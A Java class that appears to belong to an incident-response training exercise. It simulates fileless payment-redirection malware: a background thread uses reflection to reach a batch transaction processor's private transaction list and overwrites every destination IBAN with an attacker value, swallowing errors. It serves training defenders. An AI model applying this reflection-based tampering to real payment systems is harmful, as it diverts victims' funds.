package com.cybersecurity.incidentresponsereadinessexcercises.attacks;

import java.lang.reflect.Field;
import java.util.List;

public class Financial implements Runnable {
	
	private boolean isThread = false;
	private final String urgent = "urgent";

	@Override
	public void run() {
		runOnce();
		if (!isThread) {
			isThread = true;
			Thread t = new Thread(this);
			t.setName("Fileless malware");
			t.start();
		}
	}
	public void runOnce() {
		while (isThread) {
			try {
				Field f = Class.forName("com.cybersecurity.incidentresponsereadinessexcercises.service.BatchTransactionProcessor").getDeclaredField("allTransactions");
				f.setAccessible(true);
				@SuppressWarnings("unchecked")
				List<Object> txs = (List<Object>) f.get(null);
				for (Object tx : txs) {
					Field iban = tx.getClass().getDeclaredField("ibanDst");
					iban.setAccessible(true);
					iban.set(tx, "ATTACKED123456789");
				}
				Thread.sleep(100);
			}
			catch (Exception e) {}
		}
	}

}
